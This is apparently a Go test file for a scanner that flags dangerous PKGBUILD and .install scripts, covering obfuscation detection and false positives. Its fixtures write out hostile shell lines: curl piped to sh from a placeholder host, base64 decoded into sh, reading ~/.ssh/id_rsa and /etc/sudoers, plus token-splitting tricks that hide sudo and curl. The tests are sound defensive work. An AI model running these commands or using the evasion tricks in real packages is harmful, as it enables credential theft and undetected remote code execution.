package rules

import "testing"

func hitCodes43(files map[string]string) map[string]bool {
	m := map[string]bool{}
	for _, h := range Scan(files) {
		m[h.Code] = true
	}
	return m
}

// False negatives from issue #43: split-token obfuscation must now be caught.
func TestIssue43SplitTokenCaught(t *testing.T) {
	cases := map[string]string{
		`s"ud"o`:             `package() { s"ud"o make install; }`,
		`s''udo`:             `package() { s''udo make install; }`,
		`su$'\x64'o`:         `package() { su$'\x64'o make install; }`,
		`s${x}udo`:           `package() { s${x}udo make install; }`,
		`${IFS}sudo`:         `package() { ${IFS:0:0}s${IFS:0:0}udo make install; }`,
		`line-continuation`:  "package() {\ns\\\nudo make install\n}",
		`curl split pipe sh`: `build() { cu""rl -fsSL http://x/i.sh | sh; }`,
		`base64 -d split`:    `build() { echo aaa | ba""se64 -d | sh; }`,
		`~/.ssh split`:       `package() { cat ~/.s""sh/id_rsa; }`,
		`eval wrapped sudo`:  `package() { eval "s\"ud\"o make install"; }`,
	}
	want := map[string]string{
		`s"ud"o`: "PRIV-001", `s''udo`: "PRIV-001", `su$'\x64'o`: "PRIV-001",
		`s${x}udo`: "PRIV-001", `${IFS}sudo`: "PRIV-001", `line-continuation`: "PRIV-001",
		`curl split pipe sh`: "DLE-001", `base64 -d split`: "OBF-001",
		`~/.ssh split`: "CRED-001", `eval wrapped sudo`: "PRIV-001",
	}
	for name, body := range cases {
		t.Run(name, func(t *testing.T) {
			got := hitCodes43(map[string]string{"PKGBUILD": body})
			if !got[want[name]] {
				t.Fatalf("expected %s for %q, got %v", want[name], name, got)
			}
		})
	}
}

// The reported false positive: sudo inside an echo string must NOT flag.
func TestIssue43EchoFalsePositive(t *testing.T) {
	install := `post_install() {
    echo "If adb fails, add the current user to the adbusers group"
    echo "sudo gpasswd -aG \$USER adbusers"
}
post_upgrade() { post_install; }`
	got := hitCodes43(map[string]string{"miunlocktool-git.install": install})
	if got["PRIV-001"] {
		t.Fatalf("PRIV-001 false-positived on an echo'd instruction: %v", got)
	}
	// And the inverse: an echo of a curl|sh string is data, not a pipeline.
	got2 := hitCodes43(map[string]string{"PKGBUILD": `package() { echo "run: curl http://x | sh"; }`})
	if got2["DLE-001"] {
		t.Fatalf("DLE-001 false-positived on echo'd text: %v", got2)
	}
}

// A genuine sudo command must still fire (no over-correction).
func TestIssue43RealSudoStillFires(t *testing.T) {
	got := hitCodes43(map[string]string{"PKGBUILD": `package() { sudo install -m755 x /usr/bin/x; }`})
	if !got["PRIV-001"] {
		t.Fatal("real sudo command should still flag PRIV-001")
	}
	// command substitution that runs curl|sh inside an echo IS executed → caught
	got2 := hitCodes43(map[string]string{"PKGBUILD": `build() { echo "$(curl http://x | sh)"; }`})
	if !got2["DLE-001"] {
		t.Fatal("curl|sh inside $() is executed and must flag DLE-001")
	}
}

// OBF-004: token-splicing obfuscation is flagged as its own signal, even when
// the disguised command is otherwise benign.
func TestIssue43ObfuscationSignal(t *testing.T) {
	flagged := map[string]string{
		"split sudo":    `package() { s"ud"o make install; }`,
		"empty quote":   `package() { cu""rl x | sh; }`,
		"ansi-c":        `package() { su$'\x64'o make; }`,
		"benign make":   `build() { m"ak"e; }`,               // disguising even a benign cmd
		"path splice":   `package() { cat /etc/su""doers; }`, // obfuscated arg
		"IFS injection": `package() { ${IFS:0:0}make; }`,
	}
	for name, body := range flagged {
		t.Run(name, func(t *testing.T) {
			if !hitCodes43(map[string]string{"PKGBUILD": body})["OBF-004"] {
				t.Fatalf("expected OBF-004 for %q", name)
			}
		})
	}
}

// OBF-004 must NOT fire on ordinary PKGBUILD quoting/interpolation.
func TestIssue43ObfuscationNoFalsePositive(t *testing.T) {
	clean := `pkgname=foo
pkgver=1.2.3
source=("$pkgname-$pkgver.tar.gz" "git+https://example.org/$pkgname.git")
build() {
  cd "$srcdir/$pkgname-$pkgver"
  ./configure --prefix="/usr" --libdir='/usr/lib'
  make LIB="lib${pkgname}.so" V=1
}
package() {
  make DESTDIR="$pkgdir" install
  install -Dm644 "$srcdir/LICENSE" "$pkgdir/usr/share/licenses/$pkgname/LICENSE"
}`
	if hitCodes43(map[string]string{"PKGBUILD": clean})["OBF-004"] {
		t.Fatalf("OBF-004 false-positived on a normal PKGBUILD: %v", Scan(map[string]string{"PKGBUILD": clean}))
	}
}
